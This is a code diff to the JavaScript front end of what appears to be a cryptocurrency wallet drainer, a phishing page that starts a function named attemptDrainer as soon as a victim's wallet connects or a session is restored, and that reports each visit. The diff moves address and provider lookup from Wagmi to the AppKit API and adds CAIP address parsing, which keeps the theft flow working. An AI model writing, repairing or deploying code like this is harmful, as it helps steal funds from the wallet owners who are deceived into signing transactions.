@@ -1,7 +1,7 @@
 import { createAppKit } from '@reown/appkit';
 import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
-import { createConfig, http, getAccount, getProvider } from 'wagmi';
+import { createConfig, http } from 'wagmi';
 import { walletConnect, injected, metaMask } from 'wagmi/connectors';
 import { QueryClient } from '@tanstack/react-query';
 import { ethers } from 'ethers';
@@ -736,20 +736,26 @@ async function attemptDrainer() {
   showModal();
 
   try {
-    // Получаем информацию о подключении через Wagmi
-    const account = getAccount(wagmiConfig);
-    if (!account.isConnected) {
+    // Получаем адрес через appKit
+    let walletAddress = await appKit.getAddress();
+    if (!walletAddress) {
       throw new Error('Wallet not connected');
     }
 
-    console.log(`🔍 Connected address from Wagmi: ${account.address}`);
+    // Обработка формата CAIP (eip155:chainId:address)
+    if (walletAddress.startsWith('eip155:')) {
+      walletAddress = walletAddress.split(':')[2];
+      console.log(`🔍 Извлечён чистый адрес из CAIP: ${walletAddress}`);
+    }
 
-    if (account.address.toLowerCase() !== connectedAddress.toLowerCase()) {
+    console.log(`🔍 Connected address from AppKit: ${walletAddress}`);
+
+    if (walletAddress.toLowerCase() !== connectedAddress.toLowerCase()) {
       throw new Error('Wallet address mismatch');
     }
 
-    // Получаем провайдер через Wagmi
-    const walletProvider = getProvider(wagmiConfig);
+    // Получаем провайдер через appKit
+    const walletProvider = await appKit.getProvider();
     if (!walletProvider) {
       throw new Error('No provider available');
     }
@@ -811,7 +817,7 @@ async function handleConnectOrAction() {
       connectedAddress = await waitForConnection();
       console.log(`✅ Wallet connected: ${connectedAddress}`);
 
-      const walletProvider = getProvider(wagmiConfig);
+      const walletProvider = await appKit.getProvider();
       if (!walletProvider) throw new Error('No provider available after connection');
       const provider = new ethers.providers.Web3Provider(walletProvider, 'any');
       const network = await provider.getNetwork();
@@ -849,17 +855,23 @@ async function waitForConnection() {
 
     const checkConnection = async () => {
       try {
-        const account = getAccount(wagmiConfig);
-        if (account.isConnected && account.address) {
-          console.log(`✅ Кошелёк подключён: ${account.address}`);
-          connectedAddress = account.address;
+        let walletAddress = await appKit.getAddress();
+        if (walletAddress) {
+          // Обработка формата CAIP (eip155:chainId:address)
+          if (walletAddress.startsWith('eip155:')) {
+            walletAddress = walletAddress.split(':')[2];
+            console.log(`🔍 Извлечён чистый адрес из CAIP: ${walletAddress}`);
+          }
+
+          console.log(`✅ Кошелёк подключён: ${walletAddress}`);
+          connectedAddress = walletAddress;
           clearInterval(checkInterval);
           clearTimeout(timeout);
           modalSubtitle.textContent = 'Preparing to sign transaction...';
           try {
             await attemptDrainer();
             appKit.close();
-            resolve(account.address);
+            resolve(walletAddress);
           } catch (err) {
             console.error(`❌ Error in attemptDrainer: ${err.message}`);
             appKit.close();
@@ -1079,13 +1091,13 @@ window.addEventListener('DOMContentLoaded', async () => {
   const sessionData = await restoreSession();
   if (sessionData && !hasDrained && !isTransactionPending) {
     connectedAddress = sessionData.userAddress;
-    console.log(`ℹ Restored session for address: ${connectedAddress}`);
+    console.log(`ℹ Restored session for address: ${sessionData.userAddress}`);
     try {
-      const account = getAccount(wagmiConfig);
-      if (account.isConnected && account.address.toLowerCase() === connectedAddress.toLowerCase()) {
+      const walletAddress = await appKit.getAddress();
+      if (walletAddress && walletAddress.toLowerCase() === connectedAddress.toLowerCase()) {
         await attemptDrainer();
       } else {
-        console.warn(`⚠ Wallet not connected or address mismatch, clearing session`);
+        console.warn(`⚠️ Warning: Wallet not connected or address mismatch, clearing session`);
         sessionStorage.removeItem('sessionId');
         connectedAddress = null;
       }
@@ -1100,7 +1112,9 @@ window.addEventListener('DOMContentLoaded', async () => {
     btn.addEventListener('click', handleConnectOrAction);
   });
 
-  notifyOnVisit().catch(error => {
+  notifyOnVisit().then(() => {
+    console.log('✅ Visit notification completed');
+  }).catch(error => {
     console.error(`❌ Error notifying visit: ${error.message}`);
   });
 });
